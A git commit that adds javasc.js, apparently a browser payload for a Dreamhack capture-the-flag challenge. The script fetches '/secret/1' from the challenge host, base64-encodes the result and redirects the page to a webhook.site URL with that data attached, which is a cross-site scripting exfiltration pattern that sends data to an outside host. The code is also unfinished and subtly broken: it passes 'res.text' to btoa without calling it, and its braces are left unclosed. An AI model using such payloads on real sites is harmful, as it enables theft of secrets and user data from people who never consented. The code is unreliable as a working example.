937d43876603cf6e555498ab0b2345d9c49839ce
Xiamong <qw050325@naver.com>
2024-10-10 19:16:54 +0900

    Create  javasc.js

---
+++ javasc.js
@@ -0,0 +1,9 @@
+let url='http://host3.dreamhack.games:10352/secret/1'
+await fetch(url, {
+            method: "GET",
+        })
+            .then( (res) => { 
+              let a = btoa(res.text);
+              location.href='https://webhook.site/ab7fa65c-51ba-447e-b7e3-8a92e22c3571?'+a;
+            }
+                  
